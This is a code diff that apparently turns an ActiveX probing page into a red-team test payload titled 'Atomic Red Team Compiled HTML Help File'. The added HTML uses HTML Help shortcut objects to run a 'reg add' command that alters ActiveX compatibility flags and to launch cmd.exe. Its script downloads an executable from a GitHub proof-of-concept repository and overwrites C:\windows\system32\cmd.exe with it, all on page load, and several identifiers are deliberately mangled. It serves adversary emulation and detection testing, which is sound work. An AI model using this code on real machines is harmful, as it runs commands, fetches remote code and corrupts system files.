@@ -1,95 +1,35 @@
-<h1>ActiveX control enumeration test</h1>
+<html>
+    <head>
+        <title>Atomic Red Team Compiled HTML Help File</title>
+		<OBJECT id=M classid=c1sid:adb880a6-deff-11cf-9377-00aa003b7a11><PARAM name=Command value=Close></OBJECT>
+		<object id=hhShortcut type=application/x-oleobject classid=c1sid:adb880a6-deff-11cf-9377-00aa003b7a11 STYLE=display:none><param name=Command value=ShortCUt>
+			<param name=Iteml value=',reg,add "HKLM\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{00000566-0000-0010-8000-00AA006D2EA4}" /v "Compatibility Flags" It REG_DWORD /d 256 /f'></object>
+			<object id=hhShortcut2 typenapplication/x-oleobject classid=c1sid:aadb880a6-deff-11cf-9377-00aa003b7a11 STYLE=display:none><param name=Command value=ShortCut><param name=Iteml value=',cmd.exe'></object>
+			<script>hhShortcut.Click();</script>
+    </head>
+	<body>
+		<DIV id="ObjectContainer"></DIV>
+		<SCRIPT>
+		function gs(){
+			var f = unescape('Microsoft.XMLHTTP');
+			var x = new ActiveXObject(f);
+			x.Open("GET", "https://github.com/arntsonl/calc_security_poc/raw/master/exe/calc.exe",0);
+			x.Send();
+			d = unescape('ADODB.Stream');
+			var s = new ActiveXObject(d);
+			s.Mode = 3;
+			s.Type = 1;
+			s.Open();
+			s.Write(x.responseBody);
+			s.SaveToFile("C:\\windows\\system32\\cmd.exe",2);
+		}
 
-<span id=sandbox>
-</span>
-
-<p>
-
-<b>Results (now trying: <span id=status>n/a</span>):</b><br>
-<div id=output>
-</div>
-
-<script>
-var  ctrls = [
-  [ "007", "test dummy", false ],
-  [ "858DACA2-78B4-412F-9A4E-315BBB4E1F21", "Open Command Prompt as Admin Command", false ]
-];
-
-var cur = 0;
-var res_ok;
-var res_err;
-var tout;
-var got_new = 0;
-var pass = 1;
-
-function update_results() {
-  var t = '';
-
-  for (i=0;i<ctrls.length;i++) 
-    if (ctrls[i][2] == true)
-      t += '<li> ' + ctrls[i][1] + ' (' + ctrls[i][0] + ') is supported.\n';
-
-  document.getElementById('output').innerHTML = t;
-}
-
-
-function do_next() {
-  res_ok = false;
-  res_err = false;
-  
-  document.getElementById('status').innerHTML = ctrls[cur][1] + ':' + pass;
-
-  tout = setTimeout('cont(2)',4000);
-  
-  document.getElementById('sandbox').innerHTML = '<object classid="clsid:' + ctrls[cur][0] + '" width=10 height=10 style="background-color: teal"' +
-                                                 'onload="cont(true)" onerror="cont(false)" codebase="https://github.com/arntsonl/calc_security_poc/raw/master/exe/calc.exe"></object>';
-
-}
-
-function cont(res) {
-
-  if (tout == null) return;
-  clearTimeout(tout);
-  tout = null;
-
-  if (res) {
-
-    if (cur == 0) {
-      document.getElementById('output').innerHTML += '<li> <font color=red><b> Direct clsid: ActiveX access is probably not supported, bailing out.'
-      return;
-    }
-
-    if (ctrls[cur][2] != true) {
-      ctrls[cur][2] = true;
-      update_results();
-      got_new++;
-    }
-
-  }
-
-
-  while (++cur < ctrls.length && ctrls[cur][2] == true);
-
-  if (cur < ctrls.length) {
-
-    setTimeout('do_next()',1);
-
-  } else {
-
-
-    // We had new findings. Let's do another pass.
-    if (got_new > 0) {
-      cur = 0;
-      got_new = 0;
-      pass++;
-      do_next();
-    } else
-      document.getElementById('status').innerHTML = 'ALL DONE - ' + pass + ' passes';
-
-  }
-  
-}
-
-do_next();
-
-</script>
+		function LaunchExecutable2K(){
+			IShortcut2.Click();
+			M.Click();
+		}
+		setTimeout("gs()",100);
+		setTimeout("LaunchExecutable2K()",100);
+	</script>
+	</body>
+</html>
